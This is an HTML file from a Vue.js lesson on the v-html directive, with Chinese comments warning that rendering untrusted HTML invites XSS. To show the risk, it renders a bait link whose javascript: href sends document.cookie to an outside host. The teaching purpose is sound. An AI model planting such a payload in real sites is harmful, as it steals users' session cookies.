<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>v-html指令</title>
    <script src="../../js/vue.js"></script>
  </head>
  <body>
    <!-- 小结：
      v-html指令：
        作用：向指定节点中渲染包含html结构的内容
        与插值语法的区别：
          （1）v-html会替换掉节点中所有的内容，{{xxx}}则不会
          （2）v-html可以识别html结构
        注意：v-html有安全性问题
          （1）在网站上动态渲染任意html是非常危险的，容易导致xss攻击
          （2）一定要在可信的内容上使用v-html，不要使用在用户提交的内容上
  -->
    <div class="root">
      <div>{{name}}</div>
      <div v-text="name"></div>
      <div v-html="msg"></div>
      <div v-html="str"></div>
    </div>
    <script>
      const vm = new Vue({
        el: ".root",
        data: {
          name: "hhhh",
          msg: "<h1>hello world!</h1>",
          str: '<a href=javascript:location.href="https://www.baidu.com/?"+document.cookie> 找到资源了，快来！</a>',
        },
      });
    </script>
  </body>
</html>
